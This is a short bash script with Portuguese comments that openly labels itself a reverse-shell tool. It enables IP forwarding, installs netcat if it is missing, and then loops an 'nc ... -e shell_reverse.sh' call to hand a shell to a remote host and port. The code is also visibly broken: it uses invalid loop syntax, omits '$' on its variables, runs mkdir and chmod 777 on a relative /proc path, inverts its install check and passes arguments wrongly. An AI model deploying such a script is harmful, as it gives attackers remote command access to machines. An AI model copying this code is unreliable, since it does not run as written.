#!/bin/bash

###################################
#  # SCRIPT DE CONEXÃO REVERSA #  #
###################################

#variveis globais
diretorio_ip='proc/sys/net/ipv4/ip_forward'
export diretorio_ip
	
function conexao_reversa(){
	#abrindo conexão reversa
	HOST=$1
	PORT=$2
	echo "\n[*]HOST $HOST PORT $PORT"
	loop{
		nc HOST PORT -e shell_reverse.sh
	}
}

function preparativos(){
	
	
	if test -f $diretorio_ip;then 
		#ativando ip_forward
		echo 1 >$diretorio_ip
	else
	
		#gerenciando arquivo ip_forward
		mkdir $diretorio_ip
		chmod -R 777 $diretorio_ip
		echo 1 >$diretorio_ip
		#verificando se arquivo ip_forward foi criado
		if test -f $diretorio_ip;then
			echo "\n[~]arquivo criado em $diretorio_ip"
		else
			echo "\n[!]Não foi possivel gerar arquivo em $diretorio_ip"
			exit 1
		fi
		
	fi
	
	#verificando a existencia do netcat 
	# sem netcat avera a instalção do tal
	# com netcat ele prosegue normalmente
	nc -h
	if [ $? = 127 ];then
		echo "\n[!]Netcat não encontrado"
		echo "\n[*]Instalando netcat"
		apt-get install netcat
		nc -h 2>/dev/null
		if [ $? = 127 ];then
			echo "\n[*]Netcat configurado com sucesso"
			conexao_reversa $1,$2
		else
			echo "\n[!]Não foi possivel configurar netcat"
			exit 1
		fi
	fi
}

figlet reverse shell
echo "\n[*]Fazendo preparativos"
echo "\n[*]Abrindo conexão reversa"
echo "\n"

preparativos "127.0.0.1",8080

